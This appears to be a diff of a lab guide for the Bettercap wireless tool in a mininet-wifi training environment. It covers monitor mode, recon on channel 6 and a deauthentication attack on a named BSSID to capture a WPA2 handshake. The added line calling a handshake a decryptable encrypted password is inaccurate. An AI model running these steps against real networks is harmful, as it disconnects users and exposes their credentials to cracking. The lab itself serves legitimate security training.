@@ -1,10 +1,14 @@
+# Summary
+In this lab we hope to familiarize ourselves with the tool Bettercap, a common wireless auditing tool.
+
+# Getting Started with Bettercap
 Select "**Bettercap Recon**" from the menu. Allow up to 30 seconds to initialize the network. 
 
 ![[Pasted image 20250317233629.png]]
 
 *Note: normally, when using Bettercap with physical network cards, it is necessary to use “airmon-ng check kill” to kill processes that may interfere with Bettercap. However, running this command in the mininet-wifi network is unnecessary and may cause the environment to fail.*
 
-Start the monitor interface for a-wlan0.
+Start by putting the interface `a-wlan0` in monitor mode.
 
 ```bash
 airmon-ng start a-wlan0
@@ -24,13 +28,13 @@ Verify that the interface has been put into monitor mode using the following com
 ifconfig | grep flags
 ```
 
-As pictured below, a-wlan0mon should now be present. 
+As pictured below, the interface `a-wlan0mon` should now be present. 
 
 ![[Pasted image 20250317234159.png]]
 
-Launch Bettercap with the following command. 
+Launch Bettercap with the following command to interact with the interface `a-wlan0mon` the interface we previously put in monitor mode. 
 
-```
+```bash
 bettercap -iface a-wlan0mon
 ```
 
@@ -38,7 +42,7 @@ You will be greeted by a prompt of with the name of the network interface.
 
 ![[Pasted image 20250317234243.png]]
 
-Configure the console for a more convenient way to view your attack. 
+The following commands will configure the console for a more understandable workflow to view the de-authentication attack.
 
 ```bash
 set wifi.show.sort clients desc
@@ -64,19 +68,19 @@ set wifi.handshakes.file ./loot/4whs
 wifi.recon on
 ```
 
-Next, force the interface to only operate on channel 1
+Next, force the interface to only operate on channel 6
 
 ```bash
 wifi.recon.channel 6
 ```
 
-Start the deauthentication attack using the command below: 
+Start the de-authentication attack using the command below: 
 
 ```
 wifi.deauth 76:df:71:67:40:2b
 ```
 
-It may take a few seconds, but Bettercap will catch the handshake as shown below. 
+It may take a few seconds, but Bettercap will catch the handshake as shown below. A handshake is essentially an encrypted WPA2 password intercepted from between the client and router than can be decrypted offline.
 
 ![[Pasted image 20250318000519.png]]
 
